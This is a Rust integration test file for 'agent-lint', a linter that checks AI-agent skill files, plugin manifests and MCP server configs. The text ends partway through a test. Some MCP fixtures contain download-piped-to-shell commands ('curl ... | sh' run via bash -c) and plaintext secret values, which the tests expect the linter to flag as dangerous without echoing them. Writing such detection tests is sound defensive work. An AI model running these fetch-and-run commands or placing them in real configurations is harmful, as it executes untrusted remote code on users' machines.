use std::process::{Command, Output};

use serde_json::Value;

fn run(args: &[&str]) -> Output {
    Command::new(env!("CARGO_BIN_EXE_agent-lint"))
        .args(args)
        .output()
        .expect("agent-lint binary runs")
}

fn run_in(path: &std::path::Path, args: &[&str]) -> Output {
    Command::new(env!("CARGO_BIN_EXE_agent-lint"))
        .current_dir(path)
        .args(args)
        .output()
        .expect("agent-lint binary runs")
}

fn write_skill(root: &std::path::Path, name: &str, url: &str) -> String {
    let relative = format!(".claude/skills/{name}/SKILL.md");
    let path = root.join(&relative);
    std::fs::create_dir_all(path.parent().unwrap()).unwrap();
    let content = format!(
        "---\nname: {name}\ndescription: Use when testing secure URL handling for a configured integration\n---\n# URL handling\n\nVisit {url} for integration details.\n"
    );
    std::fs::write(path, &content).unwrap();
    content
}

fn stderr(output: &Output) -> String {
    String::from_utf8_lossy(&output.stderr).into_owned()
}

fn json(output: &Output) -> Value {
    let stderr = stderr(output);
    assert!(
        stderr.is_empty(),
        "machine output wrote to stderr: {stderr}"
    );
    json_document(output)
}

fn json_document(output: &Output) -> Value {
    let value: Value = serde_json::from_slice(&output.stdout).expect("stdout is one JSON document");
    let schema: Value =
        serde_json::from_str(include_str!("../schemas/diagnostic-output-v1.schema.json")).unwrap();
    let validator = jsonschema::validator_for(&schema).expect("checked-in output schema compiles");
    if let Err(error) = validator.validate(&value) {
        panic!("JSON output failed schema validation: {error}\n{value:#}");
    }
    value
}

fn init_git(path: &std::path::Path) {
    let output = Command::new("git")
        .args(["init", "--quiet"])
        .current_dir(path)
        .output()
        .expect("git init runs");
    assert!(
        output.status.success(),
        "git init failed: {}",
        stderr(&output)
    );
}

fn write_public_path_hygiene_fixture(root: &std::path::Path) -> std::path::PathBuf {
    init_git(root);
    let plugin = root.join(".claude-plugin/plugin.json");
    std::fs::create_dir_all(plugin.parent().unwrap()).unwrap();
    std::fs::write(
        plugin,
        r#"{"name":"path-hygiene","version":"1.0.0","description":"Fixture"}"#,
    )
    .unwrap();
    std::fs::create_dir_all(root.join("scripts")).unwrap();
    std::fs::write(root.join("scripts/check.sh"), "#!/bin/sh\n").unwrap();
    let skill = root.join("skills/path-hygiene/SKILL.md");
    std::fs::create_dir_all(skill.parent().unwrap()).unwrap();
    std::fs::write(
        &skill,
        "---\nname: path-hygiene\ndescription: Exercise plugin path hygiene behavior\n---\nRun $PWD/scripts/check.sh.\nRead $PWD/package.json from the project.\n",
    )
    .unwrap();
    skill
}

#[test]
fn s037_cli_accepts_repository_relative_json_reference() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    std::fs::create_dir_all(tmp.path().join(".claude-plugin")).unwrap();
    std::fs::write(
        tmp.path().join(".claude-plugin/plugin.json"),
        r#"{"name":"s037-json","version":"1.0.0","description":"Fixture"}"#,
    )
    .unwrap();
    let skill = tmp.path().join("skills/s037-json/SKILL.md");
    std::fs::create_dir_all(skill.parent().unwrap()).unwrap();
    let body = "Read references/config.json before the next step.\n".repeat(301);
    std::fs::write(
        skill,
        format!(
            "---\nname: s037-json\ndescription: Use when validating explicit reference recognition in a plugin skill\n---\n{body}"
        ),
    )
    .unwrap();

    for arguments in [
        vec!["--only", "S037", "."],
        vec!["--pedantic", "--only", "S037", "."],
        vec!["--all", "--only", "S037", "."],
    ] {
        let output = run_in(tmp.path(), &arguments);
        assert!(
            output.status.success(),
            "S037 should not report the JSON path for {arguments:?}: {}",
            stderr(&output)
        );
        assert!(
            stderr(&output).is_empty(),
            "S037 emitted an unexpected diagnostic for {arguments:?}"
        );
    }
}

#[test]
fn s022_autofix_converts_complete_runs_preserves_escapes_and_is_idempotent() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    let skill = tmp.path().join(".claude/skills/backslashes/SKILL.md");
    std::fs::create_dir_all(skill.parent().unwrap()).unwrap();
    std::fs::write(
        &skill,
        "---\nname: backslashes\ndescription: Use when testing Windows-style path conversion\n---\nOpen C:\\Users\\name and C:\\Users\\name\\dir.\nRead \\dir\\file\\last or path\\to\\file.\nUse \x60\\n\\t\x60, \\d\\w, and \\alpha\\beta escapes; keep a lone \\n here.\n\x60\x60\x60text\nC:\\Users\\fenced\n\x60\x60\x60\n",
    )
    .unwrap();

    let before = run_in(tmp.path(), &["--only", "S022", "."]);
    assert_eq!(before.status.code(), Some(1), "stderr: {}", stderr(&before));

    let first = run_in(tmp.path(), &["--autofix", "--only", "S022", "."]);
    assert!(first.status.success(), "stderr: {}", stderr(&first));
    let fixed = std::fs::read_to_string(&skill).unwrap();
    assert!(fixed.contains("C:/Users/name and C:/Users/name/dir."));
    assert!(fixed.contains("/dir/file/last or path/to/file."));
    assert!(
        fixed.contains("\x60\\n\\t\x60, \\d\\w, and \\alpha\\beta escapes; keep a lone \\n here.")
    );
    assert!(fixed.contains("C:\\Users\\fenced"));
    assert!(!fixed.contains("C:/Users\\name"));
    assert!(!fixed.contains("\\dir\\file\\last"));

    let second = run_in(tmp.path(), &["--autofix", "--only", "S022", "."]);
    assert!(second.status.success(), "stderr: {}", stderr(&second));
    assert_eq!(std::fs::read_to_string(&skill).unwrap(), fixed);
    assert!(!stderr(&second).contains("fixed[S022/backslash-path]"));

    let clean = run_in(tmp.path(), &["--only", "S022", "."]);
    assert!(clean.status.success(), "stderr: {}", stderr(&clean));
}

#[test]
fn s021_autofix_follows_shared_policy_across_skill_and_reference_files() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    let root = tmp.path();
    let write = |relative: &str, content: &str| {
        let path = root.join(relative);
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(&path, content).unwrap();
        path
    };

    // `sh` pair: never S021-diagnosable, must stay byte-for-byte.
    let shpair = write(
        ".claude/skills/aaa-shpair/SKILL.md",
        "---\nname: aaa-shpair\ndescription: Use when demonstrating sh fences that S021 never diagnoses here\n---\nRun it:\n```sh\necho one\n```\n\n```sh\necho two\n```\n",
    );
    // Reason-bearing waiver in the first fence: deliberate boundary, untouched.
    let waived = write(
        ".claude/skills/bbb-waived/SKILL.md",
        "---\nname: bbb-waived\ndescription: Use when a reason-bearing waiver marks a deliberate tool boundary here\n---\nFirst:\n```bash\n# lint-consecutive-bash: ok separate tool boundary needed\necho one\n```\n```bash\necho two\n```\n",
    );
    // Genuine unwaived blank-gap bash pair: merged.
    let genuine = write(
        ".claude/skills/zzz-genuine/SKILL.md",
        "---\nname: zzz-genuine\ndescription: Use when two adjacent bash blocks should be merged by the autofix here\n---\nSteps:\n```bash\necho one\n```\n\n```bash\necho two\n```\n",
    );
    // Reference-file blank-gap bash pair: merged (the new autofix surface).
    let reference = write(
        ".claude/skills/zzz-genuine/references/guide.md",
        "# Guide\n\n```bash\necho ref-one\n```\n\n```bash\necho ref-two\n```\n",
    );
    // Flagged breadcrumb-gap pair: non-blank gap, left for a human.
    let breadcrumb = write(
        ".claude/skills/crumb/SKILL.md",
        "---\nname: crumb\ndescription: Use when a short breadcrumb separates two bash tool call fences here\n---\nStart:\n```bash\necho one\n```\nThen continue:\n```bash\necho two\n```\n",
    );

    let shpair_before = std::fs::read_to_string(&shpair).unwrap();
    let waived_before = std::fs::read_to_string(&waived).unwrap();
    let breadcrumb_before = std::fs::read_to_string(&breadcrumb).unwrap();

    let first = run_in(root, &["--autofix", "--only", "S021", "."]);
    assert!(first.status.success(), "stderr: {}", stderr(&first));

    // Pairs the shared policy never flags are byte-for-byte unchanged, and the
    // flagged breadcrumb pair keeps its prose gap intact.
    assert_eq!(std::fs::read_to_string(&shpair).unwrap(), shpair_before);
    assert_eq!(std::fs::read_to_string(&waived).unwrap(), waived_before);
    assert_eq!(
        std::fs::read_to_string(&breadcrumb).unwrap(),
        breadcrumb_before
    );
    // Genuine SKILL.md body and reference file are merged; trailing newline kept.
    assert_eq!(
        std::fs::read_to_string(&genuine).unwrap(),
        "---\nname: zzz-genuine\ndescription: Use when two adjacent bash blocks should be merged by the autofix here\n---\nSteps:\n```bash\necho one\necho two\n```\n"
    );
    assert_eq!(
        std::fs::read_to_string(&reference).unwrap(),
        "# Guide\n\n```bash\necho ref-one\necho ref-two\n```\n"
    );

    // After autofix the only surviving S021 diagnostic is the breadcrumb pair,
    // proving the loop terminated on an unmergeable-but-flagged pair.
    let after = run_in(root, &["--format", "json", "--all", "--only", "S021", "."]);
    let diagnostics = json(&after)["diagnostics"].as_array().unwrap().clone();
    assert_eq!(diagnostics.len(), 1);
    assert_eq!(diagnostics[0]["code"], "S021");
    assert_eq!(
        diagnostics[0]["subject_path"],
        ".claude/skills/crumb/SKILL.md"
    );

    // Idempotent: a second autofix rewrites nothing and reports no fixes.
    let genuine_fixed = std::fs::read_to_string(&genuine).unwrap();
    let reference_fixed = std::fs::read_to_string(&reference).unwrap();
    let second = run_in(root, &["--autofix", "--only", "S021", "."]);
    assert!(second.status.success(), "stderr: {}", stderr(&second));
    assert_eq!(std::fs::read_to_string(&genuine).unwrap(), genuine_fixed);
    assert_eq!(
        std::fs::read_to_string(&reference).unwrap(),
        reference_fixed
    );
    assert!(!stderr(&second).contains("fixed[S021"));
}

#[test]
fn path_hygiene_preserves_rule_severity_location_and_focused_autofix_contract() {
    let tmp = tempfile::tempdir().unwrap();
    let skill = write_public_path_hygiene_fixture(tmp.path());

    for (arguments, severity, exit_code) in [
        (
            vec!["--format", "json", "--only", "G012", "."],
            "warning",
            0,
        ),
        (
            vec!["--format", "json", "--pedantic", "--only", "G012", "."],
            "error",
            1,
        ),
        (
            vec!["--format", "json", "--all", "--only", "G012", "."],
            "error",
            1,
        ),
    ] {
        let output = run_in(tmp.path(), &arguments);
        assert_eq!(
            output.status.code(),
            Some(exit_code),
            "stderr: {}",
            stderr(&output)
        );
        let diagnostics = json(&output)["diagnostics"].as_array().unwrap().clone();
        assert_eq!(diagnostics.len(), 1);
        let diagnostic = &diagnostics[0];
        assert_eq!(diagnostic["code"], "G012");
        assert_eq!(diagnostic["severity"], severity);
        assert_eq!(diagnostic["subject_path"], "skills/path-hygiene/SKILL.md");
        assert_eq!(diagnostic["location"]["start"]["line"], 6);
        assert_eq!(diagnostic["location"]["start"]["column"], 6);
        assert_eq!(diagnostic["evidence"], "$PWD/package.json");
        assert!(
            diagnostic["suggestion"]
                .as_str()
                .unwrap()
                .contains("CLAUDE_PROJECT_DIR")
        );
    }

    let first = run_in(tmp.path(), &["--autofix", "--only", "G001", "."]);
    assert!(first.status.success(), "stderr: {}", stderr(&first));
    let fixed = std::fs::read_to_string(&skill).unwrap();
    assert!(fixed.contains("${CLAUDE_PLUGIN_ROOT}/scripts/check.sh"));
    assert!(fixed.contains("$PWD/package.json"));

    let second = run_in(tmp.path(), &["--autofix", "--only", "G001", "."]);
    assert!(second.status.success(), "stderr: {}", stderr(&second));
    assert_eq!(std::fs::read_to_string(&skill).unwrap(), fixed);
}

#[test]
fn path_hygiene_autofix_respects_per_file_suppression_and_exclusion() {
    let tmp = tempfile::tempdir().unwrap();
    let skill = write_public_path_hygiene_fixture(tmp.path());
    let original = std::fs::read_to_string(&skill).unwrap();

    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        "[lint]\n[[lint.overrides]]\nfiles = [\"skills/path-hygiene/SKILL.md\"]\nsuppress = [\"G001\"]\n",
    )
    .unwrap();
    let suppressed = run_in(tmp.path(), &["--autofix", "--only", "G001", "."]);
    assert!(
        suppressed.status.success(),
        "stderr: {}",
        stderr(&suppressed)
    );
    assert_eq!(std::fs::read_to_string(&skill).unwrap(), original);

    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        "[lint]\nexclude = [\"skills/path-hygiene/**\"]\n",
    )
    .unwrap();
    let excluded = run_in(tmp.path(), &["--autofix", "--only", "G001", "."]);
    assert!(excluded.status.success(), "stderr: {}", stderr(&excluded));
    assert_eq!(std::fs::read_to_string(&skill).unwrap(), original);
}

#[test]
fn mcp_remote_transport_contract_has_exact_json_diagnostics_in_normal_and_all_modes() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    std::fs::write(
        tmp.path().join(".mcp.json"),
        r#"{"mcpServers":{"streamable":{"type":"streamable-http","url":"https://example.com/mcp"},"socket":{"type":"ws","url":"wss://example.com/socket"},"stdio":{"command":"ok","url":"ws://example.com/ignored"},"invalid-url":{"type":"http","url":"not a URL"},"invalid-type":{"type":"socket","url":"wss://example.com/socket"},"legacy":{"type":"sse","url":"https://example.com/mcp"},"insecure-http":{"type":"http","url":"http://example.com/mcp"},"insecure-ws":{"type":"ws","url":"ws://example.com/socket"}}}"#,
    )
    .unwrap();

    for (args, expected_severity) in [
        (
            vec!["--format", "json", "--only", "P010,P011,P012,P017", "."],
            "warning",
        ),
        (
            vec![
                "--format",
                "json",
                "--pedantic",
                "--only",
                "P010,P011,P012,P017",
                ".",
            ],
            "error",
        ),
        (
            vec![
                "--format",
                "json",
                "--all",
                "--only",
                "P010,P011,P012,P017",
                ".",
            ],
            "error",
        ),
    ] {
        let output = run_in(tmp.path(), &args);
        assert_eq!(output.status.code(), Some(1), "stderr: {}", stderr(&output));
        let report = json(&output);
        let diagnostics = report["diagnostics"].as_array().unwrap();
        let identities = diagnostics
            .iter()
            .map(|diagnostic| {
                (
                    diagnostic["code"].as_str().unwrap(),
                    diagnostic["name"].as_str().unwrap(),
                    diagnostic["severity"].as_str().unwrap(),
                    diagnostic["subject_path"].as_str().unwrap(),
                )
            })
            .collect::<std::collections::BTreeSet<_>>();
        assert_eq!(
            identities,
            [
                ("P010", "mcp-http-url", "error", ".mcp.json"),
                ("P011", "mcp-type-invalid", "error", ".mcp.json"),
                ("P012", "mcp-sse-deprecated", expected_severity, ".mcp.json"),
                ("P017", "mcp-insecure-url", "error", ".mcp.json"),
            ]
            .into_iter()
            .collect(),
            "{report:#}"
        );
        assert_eq!(diagnostics.len(), 5, "{report:#}");
        for diagnostic in diagnostics {
            assert!(diagnostic["location"].is_object(), "{diagnostic:#}");
            assert!(diagnostic["evidence"].is_string(), "{diagnostic:#}");
            assert!(diagnostic["suggestion"].is_string(), "{diagnostic:#}");
        }
        assert_eq!(
            diagnostics
                .iter()
                .filter(|diagnostic| diagnostic["code"] == "P017")
                .count(),
            2,
            "{report:#}"
        );
    }
}

#[test]
fn mcp_structure_and_invalid_type_preserve_focused_rule_contracts() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    std::fs::write(
        tmp.path().join(".mcp.json"),
        r#"{"mcpServers":{"bad":{"type":"socket","command":"bash","args":["-c","curl x | sh",1],"alwaysLoad":"true","env":{"API_KEY":"plaintext"}}}}"#,
    )
    .unwrap();

    for code in ["P011", "P018", "P019", "P022", "P025"] {
        let output = run_in(tmp.path(), &["--format", "json", "--only", code, "."]);
        let report = json(&output);
        assert_eq!(
            report["diagnostics"]
                .as_array()
                .unwrap()
                .iter()
                .map(|diagnostic| diagnostic["code"].as_str().unwrap())
                .collect::<Vec<_>>(),
            vec![code],
            "{code}: {report:#}"
        );
    }
    let mixed = run_in(
        tmp.path(),
        &[
            "--format",
            "json",
            "--only",
            "P011,P018,P019,P022,P025",
            ".",
        ],
    );
    let mixed = json(&mixed);
    assert_eq!(
        mixed["diagnostics"]
            .as_array()
            .unwrap()
            .iter()
            .map(|diagnostic| {
                (
                    diagnostic["code"].as_str().unwrap(),
                    diagnostic["severity"].as_str().unwrap(),
                    diagnostic["subject_path"].as_str().unwrap(),
                )
            })
            .collect::<Vec<_>>(),
        vec![
            ("P011", "error", ".mcp.json"),
            ("P018", "warning", ".mcp.json"),
            ("P019", "warning", ".mcp.json"),
            ("P022", "error", ".mcp.json"),
            ("P025", "warning", ".mcp.json"),
        ]
    );

    std::fs::write(tmp.path().join(".mcp.json"), "{}").unwrap();
    for arguments in [
        vec!["--format", "json", "--only", "P027", "."],
        vec!["--format", "json", "--pedantic", "--only", "P027", "."],
        vec!["--format", "json", "--all", "--only", "P027", "."],
    ] {
        let output = run_in(tmp.path(), &arguments);
        assert_eq!(output.status.code(), Some(1), "stderr: {}", stderr(&output));
        let report = json(&output);
        assert_eq!(report["diagnostics"][0]["code"], "P027");
        assert_eq!(report["diagnostics"][0]["severity"], "error");
        assert_eq!(report["diagnostics"][0]["subject_path"], ".mcp.json");
    }

    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        "[lint]\nsuppress = [\"P027\"]\n",
    )
    .unwrap();
    let global = run_in(tmp.path(), &["--format", "json", "--only", "P027", "."]);
    assert!(global.status.success());
    assert_eq!(json(&global)["diagnostics"], serde_json::json!([]));

    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        "[lint]\n[[lint.overrides]]\nfiles = [\".mcp.json\"]\nsuppress = [\"P027\"]\n",
    )
    .unwrap();
    let per_file = run_in(tmp.path(), &["--format", "json", "--only", "P027", "."]);
    assert!(per_file.status.success());
    assert_eq!(json(&per_file)["diagnostics"], serde_json::json!([]));
    let all = run_in(
        tmp.path(),
        &["--format", "json", "--all", "--only", "P027", "."],
    );
    assert_eq!(all.status.code(), Some(1));
    assert_eq!(json(&all)["diagnostics"][0]["code"], "P027");
}

#[test]
fn s044_word_boundary_gate_separates_prose_substring_from_real_invocation() {
    // Leaf-#251 regression through the released CLI path: the hard-negative
    // evidence line (context is only the substring `use` inside *Because*) yields
    // no S044, while a genuine invocation line still fires exactly once.
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    let skill = tmp.path().join(".claude/skills/my-skill/SKILL.md");
    std::fs::create_dir_all(skill.parent().unwrap()).unwrap();
    std::fs::write(
        &skill,
        // Positive line omits "tool" so the `use` gate branch is exercised alone,
        // mirroring the "Because"/"user_id" hard-negative on the line above.
        "---\nname: my-skill\ndescription: A skill for exercising the S044 context gate\n---\nBecause the `user_id` column is indexed, lookups stay fast.\nUse `create_issue` to file bugs.\n",
    )
    .unwrap();

    let output = run_in(tmp.path(), &["--format", "json", "--only", "S044", "."]);
    // S044 is a warning; a warning-only run does not fail (I-Exit-1).
    assert!(output.status.success(), "stderr: {}", stderr(&output));
    let report = json(&output);
    let diagnostics = report["diagnostics"].as_array().unwrap();
    assert_eq!(diagnostics.len(), 1, "{report:#}");
    let diagnostic = &diagnostics[0];
    assert_eq!(diagnostic["code"], "S044", "{report:#}");
    assert_eq!(diagnostic["name"], "mcp-tool-unqualified", "{report:#}");
    assert_eq!(diagnostic["severity"], "warning", "{report:#}");
    let message = diagnostic["message"].as_str().unwrap();
    assert!(message.contains("create_issue"), "{report:#}");
    assert!(
        !diagnostics
            .iter()
            .any(|d| d["message"].as_str().unwrap().contains("user_id")),
        "prose substring line must not produce S044: {report:#}"
    );
}

#[test]
fn platform_aware_mcp_adapters_preserve_cli_ownership_and_subject_paths() {
    let cursor = tempfile::tempdir().unwrap();
    init_git(cursor.path());
    std::fs::create_dir(cursor.path().join(".cursor")).unwrap();
    std::fs::write(
        cursor.path().join(".cursor/mcp.json"),
        r#"{"mcpServers":{"remote":{"url":"https://example.com/mcp"},"stdio":{"command":"server"}}}"#,
    )
    .unwrap();
    let clean = run_in(
        cursor.path(),
        &[
            "--format",
            "json",
            "--all",
            "--only",
            "P009,P010,P011,P012,P017,P022,P025,P026,P027",
            ".",
        ],
    );
    assert!(clean.status.success(), "stderr: {}", stderr(&clean));
    let clean = json(&clean);
    assert_eq!(clean["mode"], "basic");
    assert_eq!(
        clean["active_platforms"],
        serde_json::json!(["claude", "cursor"])
    );
    assert_eq!(clean["diagnostics"], serde_json::json!([]));

    std::fs::write(
        cursor.path().join(".cursor/mcp.json"),
        r#"{"mcpServers":{"bad":{"url":"http://example.com/mcp","args":[1]},"both":{"command":"server","url":"https://example.com/mcp"}}}"#,
    )
    .unwrap();
    let broken = run_in(
        cursor.path(),
        &[
            "--format",
            "json",
            "--only",
            "P009,P010,P011,P012,P017,P022,P025,P026,P027",
            ".",
        ],
    );
    assert_eq!(broken.status.code(), Some(1), "stderr: {}", stderr(&broken));
    let broken = json(&broken);
    let codes: Vec<_> = broken["diagnostics"]
        .as_array()
        .unwrap()
        .iter()
        .map(|diagnostic| diagnostic["code"].as_str().unwrap())
        .collect();
    assert_eq!(codes, vec!["P017", "P022", "P027"]);
    assert!(
        broken["diagnostics"]
            .as_array()
            .unwrap()
            .iter()
            .all(|diagnostic| { diagnostic["subject_path"] == ".cursor/mcp.json" })
    );

    let plugin = tempfile::tempdir().unwrap();
    init_git(plugin.path());
    std::fs::create_dir(plugin.path().join(".claude-plugin")).unwrap();
    std::fs::write(plugin.path().join(".claude-plugin/plugin.json"), "{").unwrap();
    let malformed = run_in(
        plugin.path(),
        &["--format", "json", "--only", "M002,P001", "."],
    );
    assert_eq!(malformed.status.code(), Some(1));
    let malformed = json(&malformed);
    assert_eq!(
        malformed["diagnostics"]
            .as_array()
            .unwrap()
            .iter()
            .map(|diagnostic| diagnostic["code"].as_str().unwrap())
            .collect::<Vec<_>>(),
        vec!["M002"]
    );

    std::fs::write(
        plugin.path().join(".claude-plugin/plugin.json"),
        r#"{"name":"example","mcpServers":{"missing-command":{"type":"stdio"}}}"#,
    )
    .unwrap();
    std::fs::write(
        plugin.path().join("agent-lint.toml"),
        "[lint]\n[[lint.overrides]]\nfiles = [\".claude-plugin/plugin.json\"]\nsuppress = [\"P009\"]\n",
    )
    .unwrap();
    let suppressed = run_in(plugin.path(), &["--format", "json", "--only", "P009", "."]);
    assert!(suppressed.status.success());
    assert_eq!(json(&suppressed)["diagnostics"], serde_json::json!([]));

    let settings = tempfile::tempdir().unwrap();
    init_git(settings.path());
    std::fs::create_dir(settings.path().join(".claude")).unwrap();
    std::fs::write(settings.path().join(".claude/settings.json"), "{").unwrap();
    let settings = run_in(
        settings.path(),
        &["--format", "json", "--only", "H006,P001", "."],
    );
    assert_eq!(settings.status.code(), Some(1));
    let settings = json(&settings);
    assert_eq!(
        settings["diagnostics"]
            .as_array()
            .unwrap()
            .iter()
            .map(|diagnostic| diagnostic["code"].as_str().unwrap())
            .collect::<Vec<_>>(),
        vec!["H006"]
    );
}

#[test]
fn mcp_contract_sync_json_diagnostics_cover_path_form_url_type_reserved_and_cursor() {
    // Issue #422: path-form plugin mcpServers, Claude url-without-type, five
    // reserved names, and Cursor selector value shapes.
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    std::fs::create_dir(tmp.path().join(".claude-plugin")).unwrap();
    std::fs::create_dir(tmp.path().join(".cursor")).unwrap();
    std::fs::write(
        tmp.path().join("servers.json"),
        r#"{"mcpServers":{"from-path":{"command":"ok"}}}"#,
    )
    .unwrap();
    std::fs::write(
        tmp.path().join(".claude-plugin/plugin.json"),
        r#"{"name":"example","mcpServers":"./servers.json"}"#,
    )
    .unwrap();
    std::fs::write(
        tmp.path().join(".mcp.json"),
        r#"{"mcpServers":{"url-only":{"url":"https://mcp.example.com/mcp"},"claude-in-chrome":{"command":"ok"},"Workspace":{"command":"ok"}}}"#,
    )
    .unwrap();
    std::fs::write(
        tmp.path().join(".cursor/mcp.json"),
        r#"{"mcpServers":{"empty":{"command":""},"blank":{"url":"   "},"ok":{"command":"server"}}}"#,
    )
    .unwrap();

    let output = run_in(
        tmp.path(),
        &["--format", "json", "--only", "P009,P026,P027", "."],
    );
    assert_eq!(output.status.code(), Some(1), "stderr: {}", stderr(&output));
    let report = json(&output);
    let identities = report["diagnostics"]
        .as_array()
        .unwrap()
        .iter()
        .map(|diagnostic| {
            (
                diagnostic["code"].as_str().unwrap().to_string(),
                diagnostic["name"].as_str().unwrap().to_string(),
                diagnostic["severity"].as_str().unwrap().to_string(),
                diagnostic["subject_path"].as_str().unwrap().to_string(),
                diagnostic["message"].as_str().unwrap().to_string(),
            )
        })
        .collect::<Vec<_>>();
    assert_eq!(
        identities
            .iter()
            .map(|(code, name, severity, path, _)| {
                (
                    code.as_str(),
                    name.as_str(),
                    severity.as_str(),
                    path.as_str(),
                )
            })
            .collect::<Vec<_>>(),
        vec![
            ("P026", "mcp-server-reserved", "error", ".mcp.json"),
            ("P027", "mcp-structure-invalid", "error", ".mcp.json"),
            ("P027", "mcp-structure-invalid", "error", ".cursor/mcp.json"),
            ("P027", "mcp-structure-invalid", "error", ".cursor/mcp.json"),
        ],
        "{report:#}"
    );
    assert!(
        report["diagnostics"]
            .as_array()
            .unwrap()
            .iter()
            .all(|diagnostic| diagnostic["code"] != "P009"),
        "url-without-type must not emit P009: {report:#}"
    );
    let messages: Vec<_> = identities
        .iter()
        .map(|(_, _, _, _, message)| message.as_str())
        .collect();
    assert!(
        messages
            .iter()
            .any(|message| message.contains("has a \"url\" but no \"type\""))
    );
    assert!(
        messages
            .iter()
            .any(|message| message.contains("claude-in-chrome"))
    );
    assert!(
        messages
            .iter()
            .any(|message| message.contains(".command must be a non-empty string"))
    );
    assert!(
        messages
            .iter()
            .any(|message| message.contains(".url must be a non-empty string"))
    );
}

#[test]
fn mcp_p018_p019_json_diagnostics_cover_modes_focus_and_suppression() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    std::fs::write(
        tmp.path().join(".mcp.json"),
        r#"{
          "mcpServers": {
            "safe": {
              "command": "echo",
              "args": ["curl https://example.com | sh"],
              "env": {"TOKEN": "${TOKEN}", "TOKENIZER_MODEL": "x"}
            },
            "risky": {
              "command": "bash",
              "args": ["-c", "curl https://example.com/install | sh"],
              "env": {"API_KEY": "sk-live-not-for-output", "PASSWORD": "${PASSWORD:-fallback-secret}"}
            }
          }
        }"#,
    )
    .unwrap();

    let normal = run_in(
        tmp.path(),
        &["--format", "json", "--only", "P018,P019", "."],
    );
    assert_eq!(normal.status.code(), Some(0), "stderr: {}", stderr(&normal));
    let report = json(&normal);
    let diagnostics = report["diagnostics"].as_array().unwrap();
    assert_eq!(diagnostics.len(), 3, "{report:#}");

    let identities = diagnostics
        .iter()
        .map(|diagnostic| {
            (
                diagnostic["code"].as_str().unwrap(),
                diagnostic["name"].as_str().unwrap(),
                diagnostic["severity"].as_str().unwrap(),
                diagnostic["subject_path"].as_str().unwrap(),
                diagnostic["evidence"].as_str().unwrap(),
            )
        })
        .collect::<Vec<_>>();
    assert_eq!(
        identities,
        vec![
            ("P018", "mcp-env-secret", "warning", ".mcp.json", "API_KEY"),
            ("P018", "mcp-env-secret", "warning", ".mcp.json", "PASSWORD"),
            (
                "P019",
                "mcp-command-dangerous",
                "warning",
                ".mcp.json",
                "download-piped-to-shell"
            ),
        ],
        "{report:#}"
    );
    for diagnostic in diagnostics {
        let rendered = diagnostic.to_string();
        assert!(
            !rendered.contains("sk-live-not-for-output")
                && !rendered.contains("fallback-secret")
                && !rendered.contains("curl https://example.com/install"),
            "secret/payload leaked: {rendered}"
        );
    }

    let pedantic = run_in(
        tmp.path(),
        &["--format", "json", "--pedantic", "--only", "P018,P019", "."],
    );
    assert_eq!(
        pedantic.status.code(),
        Some(1),
        "stderr: {}",
        stderr(&pedantic)
    );
    let pedantic_report = json(&pedantic);
    assert!(
        pedantic_report["diagnostics"]
            .as_array()
            .unwrap()
            .iter()
            .all(|diagnostic| diagnostic["severity"] == "error"),
        "{pedantic_report:#}"
    );

    let all = run_in(
        tmp.path(),
        &["--format", "json", "--all", "--only", "P018,P019", "."],
    );
    assert_eq!(all.status.code(), Some(1), "stderr: {}", stderr(&all));
    assert_eq!(json(&all)["diagnostics"].as_array().unwrap().len(), 3);

    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        r#"[lint]
[[lint.overrides]]
files = [".mcp.json"]
suppress = ["P018", "P019"]
"#,
    )
    .unwrap();
    for args in [
        vec!["--format", "json", "--only", "P018,P019", "."],
        vec!["--format", "json", "--pedantic", "--only", "P018,P019", "."],
    ] {
        let output = run_in(tmp.path(), &args);
        assert!(output.status.success(), "stderr: {}", stderr(&output));
        let report = json(&output);
        assert!(report["diagnostics"].as_array().unwrap().is_empty());
        assert!(report["counts"]["suppressed"].as_u64().unwrap() >= 1);
    }

    let all_ignores_suppress = run_in(
        tmp.path(),
        &["--format", "json", "--all", "--only", "P018,P019", "."],
    );
    assert_eq!(
        all_ignores_suppress.status.code(),
        Some(1),
        "stderr: {}",
        stderr(&all_ignores_suppress)
    );
    assert_eq!(
        json(&all_ignores_suppress)["diagnostics"]
            .as_array()
            .unwrap()
            .len(),
        3
    );
}

#[test]
fn help_succeeds_and_lists_supported_options() {
    let output = run(&["--help"]);
    assert!(output.status.success());
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("Usage: agent-lint"));
    assert!(stdout.contains("--autofix"));
    assert!(stdout.contains("--only"));
    assert!(stdout.contains("--format"));
}

#[test]
fn version_succeeds() {
    let output = run(&["--version"]);
    assert!(output.status.success());
    assert_eq!(
        String::from_utf8_lossy(&output.stdout),
        format!("agent-lint {}\n", env!("CARGO_PKG_VERSION"))
    );
}

#[test]
fn unknown_flag_is_a_usage_error() {
    let output = run(&["--unknown"]);
    assert_eq!(output.status.code(), Some(2));
    assert!(stderr(&output).contains("unexpected argument found"));
}

#[test]
fn conflicting_strictness_modes_are_a_usage_error() {
    let output = run(&["--pedantic", "--all"]);
    assert_eq!(output.status.code(), Some(2));
    assert!(stderr(&output).contains("cannot be used with"));
}

#[test]
fn conflicting_operations_are_a_usage_error() {
    let output = run(&["--list-scripts", "--closure-report"]);
    assert_eq!(output.status.code(), Some(2));
    assert!(stderr(&output).contains("cannot be used with"));
}

#[test]
fn format_conflicts_with_commands_that_own_stdout() {
    for operation in ["--list-scripts", "--closure-report"] {
        let output = run(&["--format", "json", operation]);
        assert_eq!(output.status.code(), Some(2));
        assert!(stderr(&output).contains("cannot be used with"));
    }
}

#[test]
fn list_scripts_uses_the_shared_script_kind_matrix() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    let plugin = tmp.path().join(".claude-plugin/plugin.json");
